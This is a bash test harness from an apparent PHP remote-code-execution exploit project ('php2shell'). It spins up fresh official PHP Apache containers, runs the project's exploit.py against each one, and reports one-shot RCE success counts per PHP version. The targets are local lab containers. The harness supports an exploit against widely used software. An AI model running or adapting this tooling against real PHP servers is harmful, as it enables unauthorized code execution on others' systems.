#!/usr/bin/env bash
#
# matrix.sh - run the php2shell exploit across several official PHP images and
# report a one-shot reliability count per version.
#
# Each trial recreates the target container from scratch (--force-recreate) so
# the number reflects a realistic cold-start, one-shot run rather than a
# heap that earlier attempts have already groomed. libphp offsets are
# auto-derived per image and the htdata offset is picked from the detected PHP
# version, so the same exploit command is used for every version.
#
# Usage:
#   scripts/matrix.sh [-n RUNS] [image ...]
#
#   -n RUNS   trials per image (default: 3)
#   image...  PHP -apache image tags (default: the supported set below)
#
# Examples:
#   scripts/matrix.sh                       # default images, 3 runs each
#   scripts/matrix.sh -n 8 php:8.5-apache   # 8 runs against 8.5
#
# Run from the repository root. Requires Docker + Compose v2 + Python 3.9+.
set -u

RUNS=3
while getopts ":n:h" opt; do
  case "$opt" in
    n) RUNS="$OPTARG" ;;
    h) sed -n '2,25p' "$0"; exit 0 ;;
    *) echo "unknown option; use -h" >&2; exit 2 ;;
  esac
done
shift $((OPTIND - 1))

IMAGES=("$@")
if [ "${#IMAGES[@]}" -eq 0 ]; then
  IMAGES=(php:8.3-apache php:8.4.26-apache php:8.5-apache)
fi

HERE="$(cd "$(dirname "$0")/.." && pwd)"
COMPOSE="docker compose -f $HERE/docker/docker-compose.yml"
URL="http://127.0.0.1:8088/index.php"

cleanup() { $COMPOSE down >/dev/null 2>&1 || true; }
trap cleanup EXIT

printf '%-22s %-10s %-10s %s\n' "IMAGE" "PHP" "DEBIAN" "ONE-SHOT RCE"
printf '%-22s %-10s %-10s %s\n' "----------------------" "--------" "--------" "------------"

for img in "${IMAGES[@]}"; do
  ok=0
  ver="?"; deb="?"
  for run in $(seq 1 "$RUNS"); do
    PHP_IMAGE="$img" $COMPOSE up -d --force-recreate >/dev/null 2>&1
    for _ in $(seq 1 60); do
      curl -fsS "$URL" >/dev/null 2>&1 && break
      sleep 0.5
    done
    ver="$(docker exec php2shell-target php -r 'echo PHP_VERSION;' 2>/dev/null || echo '?')"
    deb="$(docker exec php2shell-target cat /etc/debian_version 2>/dev/null || echo '?')"
    rm -f "$HERE/out/offsets.env" "$HERE/out/p1"
    if [ "$(timeout 240 python3 "$HERE/exploit.py" -u "$URL" -q 2>&1 | grep -c PROOF)" = "1" ]; then
      ok=$((ok + 1))
    fi
  done
  printf '%-22s %-10s %-10s %s\n' "$img" "$ver" "$deb" "$ok/$RUNS"
done
